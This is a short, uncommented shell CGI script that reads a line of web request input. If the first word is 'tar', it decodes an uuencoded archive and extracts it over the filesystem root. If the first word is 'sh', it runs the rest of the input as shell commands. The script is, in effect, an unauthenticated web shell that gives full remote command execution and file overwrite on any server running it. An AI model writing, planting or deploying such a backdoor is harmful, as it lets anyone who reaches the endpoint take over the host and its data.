#!/bin/sh

echo 'Content-type: text/html'
echo 

main() {
	[ "$1" = "tar" ] && {
		uudecode | tar -xvf - -C /
	}
	[ "$1" = "sh" ] && {
		sh
	}
}

read query
main $query

